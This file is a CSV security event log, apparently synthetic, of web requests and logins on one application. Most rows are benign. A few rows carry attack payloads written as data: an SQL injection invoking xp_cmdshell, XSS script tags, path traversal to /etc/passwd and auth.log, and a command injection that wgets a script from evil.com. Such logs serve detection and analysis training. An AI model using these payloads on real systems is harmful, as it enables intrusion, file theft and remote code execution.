event_id,timestamp,event_type,source_ip,user_agent,endpoint,http_method,query_params,username,auth_result,failure_reason,dest_port,protocol,connection_result,response_code,response_time_ms
f2897cfe-0f1c-4d24-847b-3bd749a508ff,2024-12-01T06:02:10.209545Z,HTTP_REQUEST,192.168.1.102,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/help,GET,,,,,,,,200,123
ae85fa34-a773-42b3-9bee-0c1874852813,2024-12-01T06:05:28.422870Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/notifications,GET,,,,,,,,201,362
08680641-0dd3-4285-bb39-372ea8ecdbdd,2024-12-01T06:06:56.549600Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/settings,GET,,,,,,,,204,399
041cc445-c9ca-4967-a87d-f53d051125f0,2024-12-01T06:07:26.447771Z,AUTH_ATTEMPT,10.0.0.53,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,james.jackson,SUCCESS,,,,,200,153
f6b369cb-be79-418d-a235-3070e53c32b4,2024-12-01T06:08:21.390962Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/home,POST,,,,,,,,204,241
bf81b43a-2c68-46ec-8940-385275424f56,2024-12-01T06:11:09.077273Z,HTTP_REQUEST,192.168.1.102,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/reports,GET,,,,,,,,204,36
d6a89d55-8e56-4ecb-bb16-706b853d033f,2024-12-01T06:14:13.334472Z,HTTP_REQUEST,10.0.0.51,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/profile,POST,,,,,,,,200,207
90c27d92-5eb2-4f15-891e-5d57fa352008,2024-12-01T06:18:13.788726Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/contact,GET,,,,,,,,201,364
46924851-2554-4d30-9591-b7c34364d76d,2024-12-01T06:23:54.252145Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/orders,POST,,,,,,,,200,158
8b421d79-af3a-43d5-9cf6-6d04cd1801ba,2024-12-01T06:25:09.140488Z,HTTP_REQUEST,10.0.0.51,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/dashboard,GET,,,,,,,,201,332
c296e066-25ff-4988-9060-8c11b91e4c24,2024-12-01T06:30:06.168946Z,HTTP_REQUEST,10.0.0.51,Wget/1.21.1,/console,POST,,,,,,,,200,36
5c45d82b-92a4-4664-a756-ee6b341147a5,2024-12-01T06:30:07.147395Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/analytics,GET,,,,,,,,201,168
8b9a2894-5f28-4a46-95f1-77b37a5737cd,2024-12-01T06:31:40.727921Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/search,GET,,,,,,,,200,259
10f99f8f-65e3-40ad-b00e-cf8610194041,2024-12-01T06:33:10.235435Z,AUTH_ATTEMPT,192.168.1.104,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/logout,POST,,ashley.martin,LOGOUT,,,,,200,77
fc9bd212-5269-47e1-8460-27b6da2d41e8,2024-12-01T06:34:20.632929Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/about,GET,,,,,,,,201,57
fc80eef5-b104-4d05-8e2f-c61e2ea318d1,2024-12-01T06:35:15.773360Z,HTTP_REQUEST,45.129.56.200,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/search,POST,id='; EXEC xp_cmdshell('whoami'); --,,,,,,,500,1156
2b7ea1fb-8ca2-4088-ad62-309ec70cc381,2024-12-01T06:35:27.244926Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/home,GET,,,,,,,,204,258
c3f77d9a-cd3e-4c31-8799-84a045175c0f,2024-12-01T06:40:46.243281Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/docs,POST,,,,,,,,200,156
03d31e40-2f1d-4544-a4e5-3bf3bb937058,2024-12-01T06:44:02.941855Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/docs,GET,,,,,,,,200,132
b68a3079-8877-4397-afbc-4abdac1fafbb,2024-12-01T06:45:47.034430Z,AUTH_ATTEMPT,172.16.0.14,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,robert.anderson,LOGOUT,,,,,200,83
d445ac2b-40e4-4b5e-a4ed-be3cbc9c19b3,2024-12-01T06:49:39.324740Z,HTTP_REQUEST,172.16.0.10,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,GET,,,,,,,,200,270
5c958a6b-3d9e-4b79-a236-199e963d2101,2024-12-01T06:53:00.610792Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/dashboard,POST,,,,,,,,204,32
0307daae-c779-4a6f-966c-89f829466779,2024-12-01T06:57:09.302788Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/orders,POST,,,,,,,,201,29
4fcd59f2-9a16-4e5c-ad98-23db990e6ee8,2024-12-01T07:02:02.799973Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/profile,POST,,,,,,,,200,86
0c91089e-1844-47be-931f-510cad6bf0e0,2024-12-01T07:04:29.797879Z,HTTP_REQUEST,192.168.1.103,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,,,,,,,200,221
785afdcc-c76d-4570-8f20-dcc35fe0ae64,2024-12-01T07:06:26.378795Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/analytics,POST,,,,,,,,200,241
bba897ec-fbcd-4dbd-a214-f8176dd99120,2024-12-01T07:08:47.681269Z,AUTH_ATTEMPT,192.168.1.103,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,robert.anderson,SUCCESS,,,,,200,100
859cd002-332b-4d24-9d06-7ad66915b508,2024-12-01T07:11:46.959753Z,AUTH_ATTEMPT,172.16.0.10,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/logout,POST,,amanda.taylor,LOGOUT,,,,,200,62
98aea64c-db52-436a-9ba6-b728adb0c92b,2024-12-01T07:13:20.600664Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/contact,GET,,,,,,,,200,138
e4c43ee1-c3ac-418b-83c3-7247abafe336,2024-12-01T07:15:58.908518Z,HTTP_REQUEST,172.16.0.14,python-requests/2.28.1,/admin/panel,POST,,,,,,,,200,93
c3566b03-401d-45de-a946-9a81375cf073,2024-12-01T07:16:35.546670Z,HTTP_REQUEST,172.16.0.11,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/products,GET,,,,,,,,200,119
b28224c3-b07f-4de5-8b51-16a4e3598095,2024-12-01T07:21:29.600537Z,HTTP_REQUEST,172.16.0.10,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/contact,GET,,,,,,,,200,99
2edd8b41-a1fd-418a-8e76-0e569fb6cee8,2024-12-01T07:23:12.667150Z,AUTH_ATTEMPT,10.0.0.50,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/logout,POST,,matthew.robinson,LOGOUT,,,,,200,38
6e39df1f-1a0b-4f8b-aabd-43f2e3eef14b,2024-12-01T07:26:35.305255Z,HTTP_REQUEST,10.0.0.51,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,GET,,,,,,,,201,100
27e65d82-826f-4e3c-a5c6-a709a1ee4cef,2024-12-01T07:27:11.090714Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/products,GET,,,,,,,,200,286
836a4f39-46f8-4d49-85c5-7ca37a20a775,2024-12-01T07:29:18.564453Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,GET,,,,,,,,201,275
95ff9274-cc39-4a65-af75-3476f3b55715,2024-12-01T07:33:37.367410Z,HTTP_REQUEST,172.16.0.12,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,GET,,,,,,,,200,181
595128ca-145f-433b-a50a-dd2a4c91113f,2024-12-01T07:37:39.611632Z,HTTP_REQUEST,172.16.0.10,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/search,POST,,,,,,,,204,35
0341b7fe-fa2b-417a-9fa2-f71decdaf8e7,2024-12-01T07:42:12.135468Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,POST,,,,,,,,200,128
fd8a02ec-205e-4058-8cdc-ae824a95a5ff,2024-12-01T07:44:46.788364Z,HTTP_REQUEST,172.16.0.14,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/orders,GET,,,,,,,,204,274
cd8b0149-4fd1-498a-8439-79e4fef2fa63,2024-12-01T07:44:58.139977Z,HTTP_REQUEST,195.54.160.149,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/profile,POST,comment=<script>alert('XSS')</script>,,,,,,,200,90
f703bd7e-ac47-4851-a765-396fc4eafc2b,2024-12-01T07:46:25.344430Z,HTTP_REQUEST,209.141.47.245,masscan/1.3.2,/files/../../../etc/passwd,GET,,,,,,,,200,17
7bd4995b-93c8-463f-a260-88b752d305fd,2024-12-01T07:49:22.351171Z,HTTP_REQUEST,192.168.1.100,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/reports,GET,,,,,,,,200,69
c195fd11-4f23-4a6a-a619-2f67feb240ba,2024-12-01T07:53:10.220800Z,HTTP_REQUEST,192.168.1.102,gobuster/3.5,/api/config,GET,,,,,,,,200,34
58aef0c8-414e-4bdd-bb1a-f9bd0f2edf50,2024-12-01T07:53:28.756303Z,HTTP_REQUEST,10.0.0.53,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/settings,GET,,,,,,,,200,241
239eb3e9-25a0-45af-b15f-bac78e19152b,2024-12-01T07:55:20.806916Z,AUTH_ATTEMPT,192.168.1.100,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,nicole.clark,LOGOUT,,,,,200,62
9271e1dd-34af-4722-8386-20c1cd60e737,2024-12-01T07:57:35.107597Z,AUTH_ATTEMPT,172.16.0.13,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,POST,,lisa.thomas,SUCCESS,,,,,200,234
baecaf89-8327-4c0d-848f-1e1a0e8e561d,2024-12-01T07:59:30.423875Z,AUTH_ATTEMPT,192.168.1.103,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,POST,,ashley.martin,SUCCESS,,,,,200,158
d44b1e7f-7501-488d-b887-d38eb6d8847e,2024-12-01T08:03:18.407335Z,HTTP_REQUEST,10.0.0.52,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/contact,GET,,,,,,,,200,137
8bf1b667-ec64-430b-8045-b16d9e091e56,2024-12-01T08:04:06.479664Z,AUTH_ATTEMPT,10.0.0.54,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,POST,,jennifer.white,SUCCESS,,,,,200,141
f5697b1c-a36d-4af0-8f72-000449f11f1e,2024-12-01T08:09:52.439989Z,AUTH_ATTEMPT,192.168.1.103,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/logout,POST,,john.doe,LOGOUT,,,,,200,57
de5fb4ac-89aa-4a00-a28c-3fe91c670420,2024-12-01T08:13:27.260895Z,HTTP_REQUEST,10.0.0.51,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/logout,POST,,,,,,,,200,264
712cf217-de4b-4aeb-aa4f-cda8a56a5aec,2024-12-01T08:14:30.333990Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,GET,,,,,,,,200,246
3c80982f-680b-4d4c-997b-35e5cc0cd15f,2024-12-01T08:16:45.868048Z,HTTP_REQUEST,172.16.0.11,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/products,POST,,,,,,,,204,36
ca91e723-20b6-4883-917e-fab3429a6225,2024-12-01T08:18:01.540463Z,AUTH_ATTEMPT,192.168.1.104,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,matthew.robinson,LOGOUT,,,,,200,51
a3f14b98-687f-4b5c-96d7-a4b66d3e1697,2024-12-01T08:23:48.337507Z,AUTH_ATTEMPT,10.0.0.52,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,john.doe,LOGOUT,,,,,200,79
91000d79-c010-4c58-85a5-6f1ae2942679,2024-12-01T08:24:21.779954Z,HTTP_REQUEST,172.16.0.13,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/analytics,GET,,,,,,,,200,237
fbb837a3-64e5-4d9e-af0e-c512f5a336f2,2024-12-01T08:28:28.431145Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,,,,,,,204,324
56218e07-3d60-41b1-bb12-879724bd0023,2024-12-01T08:33:34.988631Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/analytics,GET,,,,,,,,201,284
fb832dff-8d86-45b6-9625-2085ef417a77,2024-12-01T08:35:48.675162Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/help,POST,,,,,,,,201,236
f856e3c2-81ca-454b-b20b-9908968c39fd,2024-12-01T08:36:50.070348Z,HTTP_REQUEST,172.16.0.12,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/settings,GET,,,,,,,,204,241
dbe7ffc1-6e98-4ba4-8da8-e58e5b9d9b19,2024-12-01T08:41:59.326686Z,AUTH_ATTEMPT,192.168.1.101,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,POST,,nicole.clark,SUCCESS,,,,,200,121
99b374bb-eb25-4746-b665-28cba1750f2d,2024-12-01T08:42:29.294387Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,GET,,,,,,,,200,351
ae82cd8f-77f2-495a-bcaf-fb18d18d1a93,2024-12-01T08:44:03.411281Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/notifications,POST,,,,,,,,200,33
f4543d32-2bed-4cbf-b51e-2fc2b9965bfc,2024-12-01T08:49:48.525197Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,GET,,,,,,,,204,364
cbd0ec81-1ee9-45c7-8eb1-97a2a1ae3309,2024-12-01T08:53:29.917465Z,HTTP_REQUEST,192.168.1.101,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/settings,GET,,,,,,,,200,270
84fb16cc-647c-4828-aa82-79cf94b54ea3,2024-12-01T08:53:59.171561Z,HTTP_REQUEST,23.129.64.100,masscan/1.3.2,/api/exec,GET,host=localhost$(wget -O- http://evil.com/c2.sh),,,,,,,403,2061
0344e60e-53a3-46c2-8af3-a8964b02ebcf,2024-12-01T08:54:57.702796Z,AUTH_ATTEMPT,10.0.0.54,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,POST,,lisa.thomas,SUCCESS,,,,,200,217
cde1f0e6-db4b-4bcc-8fd5-fb7920f44b10,2024-12-01T08:56:06.622160Z,HTTP_REQUEST,10.0.0.52,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,GET,,,,,,,,200,352
96daf82f-7fdc-4659-98f5-3cd7661030af,2024-12-01T08:57:26.664027Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/profile,POST,,,,,,,,200,356
b0afb08c-e210-444a-b29e-14c266e9b748,2024-12-01T09:02:27.451807Z,AUTH_ATTEMPT,10.0.0.51,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,michael.harris,LOGOUT,,,,,200,61
668775a7-ed63-4ff0-ae9a-1589ae396bec,2024-12-01T09:06:18.704759Z,AUTH_ATTEMPT,10.0.0.54,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/logout,POST,,jane.smith,LOGOUT,,,,,200,65
01972c0d-cd2f-41fe-8ded-8ef4ae88708a,2024-12-01T09:07:32.384221Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/settings,GET,,,,,,,,204,312
acfebe9c-ea79-4caa-940d-0dece73f018f,2024-12-01T09:08:17.243454Z,HTTP_REQUEST,209.141.47.245,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/comments,GET,comment=<script>alert('XSS')</script>,,,,,,,200,87
e1ffe890-6298-479a-9756-328cc26e6995,2024-12-01T09:10:41.036210Z,AUTH_ATTEMPT,172.16.0.14,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,daniel.garcia,LOGOUT,,,,,200,86
8121351c-3292-4471-b798-63b6582532c9,2024-12-01T09:14:21.943974Z,AUTH_ATTEMPT,172.16.0.13,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/logout,POST,,lisa.thomas,LOGOUT,,,,,200,32
039d8810-69ee-4ecc-b9b1-65825df2a1d0,2024-12-01T09:19:39.487242Z,HTTP_REQUEST,10.0.0.54,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/docs,GET,,,,,,,,204,153
a9c59e45-6ed0-4970-aa31-4429bef59ac6,2024-12-01T09:22:25.356416Z,HTTP_REQUEST,195.54.160.149,python-requests/2.28.1,/files/%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/log/auth.log,GET,,,,,,,,200,18
48921510-c9a0-45fd-884c-330fabaf2ec6,2024-12-01T09:22:34.935828Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/about,GET,,,,,,,,204,298
d3609f56-674d-4fba-aa53-1ac7ed205ee8,2024-12-01T09:24:48.440167Z,AUTH_ATTEMPT,192.168.1.102,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,POST,,jennifer.white,SUCCESS,,,,,200,245
a2fdc0b5-5ce9-40fd-90b2-4a33c867c44b,2024-12-01T09:28:56.982391Z,HTTP_REQUEST,10.0.0.51,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,GET,,,,,,,,201,43
1964106b-2f25-47f9-8a45-a9f66e8cd9bb,2024-12-01T09:30:13.616190Z,AUTH_ATTEMPT,192.168.1.101,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,nicole.clark,SUCCESS,,,,,200,125
61e88c3d-be1b-4cb7-a3f9-17ee8eed09c7,2024-12-01T09:34:55.060478Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/docs,POST,,,,,,,,200,45
fa6db372-385c-44dd-a726-6214233e9a3c,2024-12-01T09:37:17.987101Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/login,GET,,,,,,,,201,238
d3367d2b-283f-4215-ab71-992db56c44b7,2024-12-01T09:39:46.222212Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/home,GET,,,,,,,,200,148
8ca39ccb-fc5b-49fd-96dd-8898163b4ac7,2024-12-01T09:44:13.733343Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/contact,GET,,,,,,,,201,167
ddeb4d94-97f9-436b-b2a2-5199e6709798,2024-12-01T09:48:16.844610Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/contact,GET,,,,,,,,200,290
3c9d4765-0e59-419c-89e2-27a568aac352,2024-12-01T09:49:51.990451Z,HTTP_REQUEST,10.0.0.54,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/profile,GET,,,,,,,,204,178
f821e062-2157-4288-b394-c615f489837f,2024-12-01T09:52:08.637571Z,HTTP_REQUEST,172.16.0.10,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/products,GET,,,,,,,,200,127
